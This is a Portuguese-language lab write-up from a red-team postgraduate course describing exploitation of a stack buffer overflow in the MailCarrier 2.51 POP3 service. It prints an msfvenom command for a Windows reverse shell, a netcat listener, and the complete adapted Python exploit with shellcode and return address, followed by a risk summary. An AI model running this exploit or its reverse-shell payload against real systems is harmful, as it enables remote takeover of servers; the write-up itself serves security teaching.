---
title: "Buffer Overflow no MailCarrier 2.51 (POP3)"
date: 2026-08-20 10:00:00 -0300
categories: [Writeups, FIAP]
tags: [windows, buffer-overflow, exploit-development, msfvenom, shellcode, pop3, mailcarrier, reverse-shell]
---

Neste artigo técnico, detalho a resolução de um laboratório realizado na pós-graduação de Offensive Cyber Security - Red Team Ops da FIAP. O objetivo central foi explorar uma vulnerabilidade clássica de Stack-based Buffer Overflow em um servidor.

Mais do que seguir um caminho rígido, este relato demonstra como a adaptabilidade técnica permite encontrar múltiplos caminhos para o mesmo objetivo: em vez de criar uma ferramenta totalmente do zero, utilizei e ajustei um exploit público já existente (EDB-ID 47554) para contornar restrições de ambiente e garantir a execução remota de código (RCE).

## 1. Contextualização e Motivação

Em operações de Red Team e testes de intrusão, falhas de estouro de buffer baseadas em pilha continuam sendo um dos vetores mais destrutivos quando presentes em softwares legados. Sistemas que não validam adequadamente o tamanho dos dados inseridos em funções de manipulação de memória permitem que um atacante corrompa o fluxo de execução, reescrevendo o registrador EIP (Instruction Pointer) para apontar para um código arbitrário.

O desafio simulava a intrusão em um serviço POP3 vulnerável (MailCarrier 2.51) hospedado na VM alvo. O escopo exigia configurar um ambiente de testes seguro no VirtualBox, identificar o vetor de ataque, adaptar um exploit de referência, obter acesso interativo ao sistema e extrair a evidência final.

## 2. Descoberta de Serviço Vulnerável

O primeiro passo da operação consistiu no reconhecimento de rede e na enumeração de portas e serviços abertos na máquina alvo. Utilizando o Nmap com varredura de versões para identificar softwares em execução nas portas padrão:

![Varredura de portas e serviços](/assets/img/posts/mailcarrier-buffer-overflow/varredura-portas.png)
_Varredura de portas e serviços disponíveis no servidor_

A varredura identificou a porta 110 (POP3) aberta, mas não trouxe uma identificação conclusiva do software por trás do serviço. Ao me conectar diretamente na porta para inspecionar o banner de resposta, encontrei uma mensagem customizada (algo como "TABS Lab POP3 server"), sem menção direta a "MailCarrier". Pesquisando essa string de banner específica, identifiquei que o software por trás dessa implementação era, na verdade, o MailCarrier 2.51.

## 3. Pesquisa de Exploit na Base

Para acelerar o ciclo de desenvolvimento em um cenário de tempo restrito, realizei uma busca em bases públicas de vulnerabilidades (como o Exploit-DB) e identifiquei o exploit clássico EDB-ID 47554, originalmente escrito para o MailCarrier 2.51. Realizei o download com `searchsploit -m 47554`.

![Exploit EDB-ID 47554 utilizado](/assets/img/posts/mailcarrier-buffer-overflow/exploit-mail.png)
_Exploit EDB-ID 47554_

O script fornecia a estrutura base de conexão via socket TCP e o esqueleto do payload, mas exigia uma série de modificações críticas para rodar no ambiente de laboratório atual. Para adaptar o exploit público (`EDB-ID 47554`), realizei ajustes essenciais que incluíram a declaração explícita de codificação UTF-8 na primeira linha do script para contornar erros de sintaxe por caracteres invisíveis, além da reestruturação da rotina de sockets para interagir perfeitamente com o banner inicial do servidor POP3.

## 4. Alterações em Shellcode e Payload

Um exploit público raramente funciona "out of the box" sem ajustes finos de engenharia reversa e payload. Realizei as seguintes alterações estruturais:

### 4.1 Geração de Novo Shellcode

Substituí o payload original do script por um gerado via msfvenom focado em uma conexão reversa TCP, respeitando os bad characters mapeados para a aplicação (`\x00` e `\xd9`):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.106 LPORT=4444 EXITFUNC=seh -b "\x00\xd9" -f python
```

### 4.2 Ajuste de Offset

O exploit original do MailCarrier 2.51 já trazia em sua estrutura uma série de opções de offset pré-comentadas, acompanhadas de um aviso importante do autor: o tamanho exato do buffer depende do comprimento do endereço IP da máquina atacante inserido no shellcode (msfvenom).

Como a ferramenta de geração de payloads embute o LHOST (192.168.2.106) diretamente no código executável, o tamanho total da string gerada sofre variações sutis que podem deslocar o ponteiro de instrução EIP. Se o alinhamento falhar, o programa sofre um Access Violation e derruba a conexão antes de abrir a shell.

Para resolver isso, aproveitei as linhas de testes já previstas no script e ativei a linha exata que apontava para o offset de 5094 bytes, garantindo o encaixe perfeito na pilha:

```python
# Trecho alterado no script para o nosso IP (192.168.2.106):
#buffer = '\x41' * 5093  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
buffer = '\x41' * 5094  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
#buffer = '\x41' * 5095  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
```

Essa linha diz ao script para preencher a pilha com 5094 caracteres de enchimento (`\x41` / "A"), seguido pelo endereço estático de salto (jmpesp), um bloco de sled de NOPs (`\x90`) de 20 bytes para estabilização, o payload gerado (buf), e completado com o preenchimento final do buffer (`\x43` / "C") para manter o tamanho total exato esperado pela aplicação sem corromper áreas adjacentes indesejadas.

O script final ficou da seguinte forma:

```python
# -*- coding: utf-8 -*-
#!/usr/bin/python

import sys
import socket
import time

buf =  b""
buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x4f\x6b\xbd\xd7\x83\xee\xfc\xe2\xf4"
buf += b"\xb3\x83\x3f\xd7\x4f\x6b\xdd\x5e\xaa\x5a\x7d\xb3"
buf += b"\xc4\x3b\x8d\x5c\x1d\x67\x36\x85\x5b\xe0\xcf\xff"
buf += b"\x40\xdc\xf7\xf1\x7e\x94\x11\xeb\x2e\x17\xbf\xfb"
buf += b"\x6f\xaa\x72\xda\x4e\xac\x5f\x25\x1d\x3c\x36\x85"
buf += b"\x5f\xe0\xf7\xeb\xc4\x27\xac\xaf\xac\x23\xbc\x06"
buf += b"\x1e\xe0\xe4\xf7\x4e\xb8\x36\x9e\x57\x88\x87\x9e"
buf += b"\xc4\x5f\x36\xd6\x99\x5a\x42\x7b\x8e\xa4\xb0\xd6"
buf += b"\x88\x53\x5d\xa2\xb9\x68\xc0\x2f\x74\x16\x99\xa2"
buf += b"\xab\x33\x36\x8f\x6b\x6a\x6e\xb1\xc4\x67\xf6\x5c"
buf += b"\x17\x77\xbc\x04\xc4\x6f\x36\xd6\x9f\xe2\xf9\xf3"
buf += b"\x6b\x30\xe6\xb6\x16\x31\xec\x28\xaf\x34\xe2\x8d"
buf += b"\xc4\x79\x56\x5a\x12\x03\x8e\xe5\x4f\x6b\xd5\xa0"
buf += b"\x3c\x59\xe2\x83\x27\x27\xca\xf1\x48\x94\x68\x6f"
buf += b"\xdf\x6a\xbd\xd7\x66\xaf\xe9\x87\x27\x42\x3d\xbc"
buf += b"\x4f\x94\x68\x87\x1f\x3b\xed\x97\x1f\x2b\xed\xbf"
buf += b"\xa5\x64\x62\x37\xb0\xbe\x2a\xbd\x4a\x03\x7d\x7f"
buf += b"\x4d\x01\xd5\xd5\x4f\x7a\xe1\x5e\xa9\x01\xad\x81"
buf += b"\x18\x03\x24\x72\x3b\x0a\x42\x02\xca\xab\xc9\xdb"
buf += b"\xb0\x25\xb5\xa2\xa3\x03\x4d\x62\xed\x3d\x42\x02"
buf += b"\x27\x08\xd0\xb3\x4f\xe2\x5e\x80\x18\x3c\x8c\x21"
buf += b"\x25\x79\xe4\x81\xad\x96\xdb\x10\x0b\x4f\x81\xd6"
buf += b"\x4e\xe6\xf9\xf3\x5f\xad\xbd\x93\x1b\x3b\xeb\x81"
buf += b"\x19\x2d\xeb\x99\x19\x3d\xee\x81\x27\x12\x71\xe8"
buf += b"\xc9\x94\x68\x5e\xaf\x25\xeb\x91\xb0\x5b\xd5\xdf"
buf += b"\xc8\x76\xdd\x28\x9a\xd0\x6d\x4b\x76\x76\xd5\x71"
buf += b"\xda\xd6\x20\x28\x9a\x57\xbb\xab\x45\xeb\x46\x37"
buf += b"\x3a\x6e\x06\x90\x5c\x19\xd2\xbd\x4f\x38\x42\x02"

jmpesp = '\x23\x49\xA1\x0F'
buffer = '\x41' * 5094  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)

print "[*] MailCarrier 2.51 POP3 Buffer Overflow in USER command\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(("192.168.2.114", 110))
print s.recv(1024)
s.send('USER ' + buffer + '\r\n')
print s.recv(1024)
s.send('QUIT\r\n')
s.close()
time.sleep(1)
print "[*] Done, but if you get here the exploit failed!"
```

## 5. Pós-Exploração e Obtenção da Flag

Com o script adaptado e o escutador de rede ativo na máquina Kali Linux (`nc -lvnp 4444`), executei o exploit ajustado. O serviço processou o estouro de buffer, desviou o fluxo de execução para meu bloco de NOPs e abriu com sucesso a shell reversa.

![Exploit bem sucedido](/assets/img/posts/mailcarrier-buffer-overflow/exploit.png)
_Exploit bem sucedido_

Utilizando o prompt de comandos do Windows obtido na sessão, realizei a busca recursiva pelo arquivo de evidência solicitado e adquiri a flag.

## 6. Visão Executiva e Análise de Riscos

Do ponto de vista de negócios e governança, uma falha de segurança como esta representa o cenário de maior gravidade para qualquer organização, demonstrando que um invasor externo pode burlar as defesas perimetrais e assumir o controle de sistemas corporativos críticos. Quando um atacante consegue executar código remotamente em um servidor, as consequências podem paralisar o negócio. Em um ambiente corporativo real, os principais riscos envolvem a interrupção total de sistemas essenciais para a operação diária, o vazamento de informações confidenciais de clientes e estratégias de mercado, além da propagação do ataque pela rede interna para infectar outros servidores e paralisar a empresa com sequestro de dados.

Essa vulnerabilidade é reflexo direto de tecnologias ultrapassadas e de softwares antigos que foram desenvolvidos sem os padrões de segurança que exigimos hoje, deixando brechas críticas na forma como o sistema lida com dados recebidos de fora. Para proteger a empresa contra esse tipo de exposição, a liderança deve apoiar a aposentadoria imediata de sistemas legados que não recebem mais correções do fabricante, substituindo-os por soluções modernas, e garantir uma gestão rigorosa de atualizações aliada a ferramentas avançadas de monitoramento capazes de detectar comportamentos estranhos na rede antes que causem danos reais.